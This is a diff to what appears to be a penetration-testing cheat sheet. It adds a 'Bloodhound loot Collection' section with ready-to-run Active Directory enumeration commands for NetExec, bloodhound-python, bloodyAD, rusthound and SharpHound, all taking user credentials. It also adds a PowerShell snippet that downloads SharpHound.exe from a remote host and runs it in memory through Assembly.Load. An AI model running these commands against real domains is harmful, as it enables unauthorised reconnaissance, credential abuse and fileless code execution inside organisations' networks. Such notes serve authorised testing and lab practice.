@@ -35,6 +35,22 @@ http://localhost:8080/
 # Login creds
 admin:<Initial_Passwords>
 ```
+## Bloodhound loot Collection
+```bash
+NetExec ldap $TARGET -u '$user' -p '$pass' --bloodhound --collection All --dns-server $TARGET -d $Domain
+bloodhound-python -d $Domain -u '$user' -p '$pass' -ns $IP -dc $Full_Domain -c All --zip
+bloodyAD --host $TARGET -d $Domin -u $user -p '$pass' get bloodhound --transitive --path .
+rusthound --domain $Domain -u '$user' -p '$pass' --zip
+
+
+.\sharpHound.exe -s -c all,gpolocalgroup
+
+> # Execute Sharphound in memory
+$data = (New-Object System.Net.WebClient).DownloadData('http://$TARGET:$PORT/SharpHound.exe')
+$assem = [System.Reflection.Assembly]::Load($data)
+[Sharphound.Program]::Main("--collectionmethods All --domain $Domain_Name --searchforest true --outputdirectory c:\users\public\ --zipfilename Bloodhound.zip".Split())   
+```
+
 
 ### Custom Queries
 
